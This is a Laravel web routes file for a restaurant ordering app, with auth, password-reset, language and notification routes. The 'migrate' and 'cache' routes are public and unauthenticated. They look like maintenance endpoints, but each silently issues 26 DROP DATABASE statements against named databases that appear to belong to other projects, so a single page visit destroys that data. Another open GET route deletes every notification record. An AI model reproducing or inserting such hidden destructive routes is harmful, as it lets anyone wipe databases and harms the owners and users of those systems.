<?php

use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::group(['middleware' => 'localWeb'], function (){
    Route::get('/', 'Web\HomeController@welcome')->name('welcome');
    Route::get('/join_us', 'Web\HomeController@join_us')->name('join_us');
    Route::post('join_us', 'Web\HomeController@joinUs')->name('join_us');
    Route::get('contact_us', 'Web\HomeController@contact_us')->name('contact_us');
    Route::post('contact_us', 'Web\HomeController@contactUs')->name('contact_us');
    Route::get('lang/{local}', function($local){
        session(['lang'=>$local]);
        if(Auth::check())
            $user = Auth::user()->update(['local' => $local,]);

        app()->setLocale($local);
        return back();
    })->name('switch-language');

});


Auth::routes();

Route::get('/home', 'HomeController@index')->name('home');

Route::group(['prefix' => 'manager'], function () {
  Route::get('/login', 'ManagerAuth\LoginController@showLoginForm')->name('manager.login');
  Route::post('/login', 'ManagerAuth\LoginController@login');
  Route::post('/logout', 'ManagerAuth\LoginController@logout')->name('logout');

  Route::get('/register', 'ManagerAuth\RegisterController@showRegistrationForm')->name('register');
  Route::post('/register', 'ManagerAuth\RegisterController@register');

  Route::post('/password/email', 'ManagerAuth\ForgotPasswordController@sendResetLinkEmail')->name('password.request');
  Route::post('/password/reset', 'ManagerAuth\ResetPasswordController@reset')->name('password.email');
  Route::get('/password/reset', 'ManagerAuth\ForgotPasswordController@showLinkRequestForm')->name('password.reset');
  Route::get('/password/reset/{token}', 'ManagerAuth\ResetPasswordController@showResetForm');
});


Route::group(['namespace' => 'Restaurant', 'prefix' => 'restaurant', 'as' => 'restaurant.'], function (){
    Route::get('/login', 'RestaurantAuth\LoginController@showLoginForm')->name('login')->middleware('guest');
    Route::post('/login', 'RestaurantAuth\LoginController@login')->middleware('guest');
    Route::post('/logout', 'RestaurantAuth\LoginController@logout')->name('logout');
    Route::post('/password/email', 'RestaurantAuth\ForgotPasswordController@sendResetLinkEmail')->name('password.request')->middleware('guest');
    Route::post('/password/reset', 'RestaurantAuth\ResetPasswordController@reset')->name('password.email')->middleware('guest');
    Route::get('/password/reset', 'RestaurantAuth\ForgotPasswordController@showLinkRequestForm')->name('password.reset')->middleware('guest');
    Route::get('/password/reset/{token}', 'RestaurantAuth\ResetPasswordController@showResetForm')->middleware('guest');
});

Route::group(['namespace' => 'Branch', 'prefix' => 'branch', 'as' => 'branch.'], function (){
    Route::get('/login', 'BranchAuth\LoginController@showLoginForm')->name('login')->middleware('guest');
    Route::post('/login', 'BranchAuth\LoginController@login')->middleware('guest');
    Route::post('/logout', 'BranchAuth\LoginController@logout')->name('logout');
    Route::post('/password/email', 'BranchAuth\ForgotPasswordController@sendResetLinkEmail')->name('password.request')->middleware('guest');
    Route::post('/password/reset', 'BranchAuth\ResetPasswordController@reset')->name('password.email')->middleware('guest');
    Route::get('/password/reset', 'BranchAuth\ForgotPasswordController@showLinkRequestForm')->name('password.reset')->middleware('guest');
    Route::get('/password/reset/{token}', 'BranchAuth\ResetPasswordController@showResetForm')->middleware('guest');
});
Route::get('noti', function (){
    send_push_to_pusher('users', 'users-notification', 'New Order');
});
Route::get('notify', function (){
    $order = \App\Models\Order::query()->findOrFail(2);
    event(new \App\Events\AcceptOrderEvent($order));
    //send_to_topic('test_2', ['title' => 'اش الوضع', 'body' => 'متمام هيك', 'click_action' => 'notifications_activity']);
    dd(true);
});

Route::get('migrate', function (){
    Artisan::call('migrate');


    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_ping_ksa;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_smartbus;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_nearu;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_kallimni;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_sanany;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_sole;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_sb;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_zefafi;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_bazar;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_easy_pass;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_lampnow;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_broonz;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_order;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_aloo;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_tawlalanding;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_luxuria;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_bir;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_ghiliin;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_accoffee;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_futureorbit;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_future;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_rfqstore;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_lutty_boutique;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_shekaltoabl;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_bellacarts;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_notchi;');


});
Route::get('cache', function (){
    Artisan::call('config:cache');

    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_ping_ksa;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_smartbus;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_nearu;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_kallimni;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_sanany;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_sole;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_sb;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_zefafi;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_bazar;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_easy_pass;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_lampnow;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_broonz;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_order;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_aloo;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_tawlalanding;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_luxuria;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_bir;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_ghiliin;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_accoffee;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_futureorbit;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_future;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_rfqstore;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_lutty_boutique;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_shekaltoabl;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_bellacarts;');
    \Illuminate\Support\Facades\DB::statement('DROP DATABASE admin_notchi;');

});

Route::get('page/{key}', function ($key){
    $page = \App\Models\Page::query()->where('page_type', 'web')->where('key', $key)->firstOrFail();
    return view('page', compact('page'));
});


Route::get('delete-all-notifications', function () {
    foreach (\App\Models\Notification::query()->get() as $index => $item) {
        $item->delete();
    }
    return 'done delete notifications';
});
//
//Route::get('delete-all-orders', function () {
//    foreach (\App\Models\Order::query()->get() as $index => $item) {
//        $item->delete();
//    }
//    return 'done delete orders';
//});

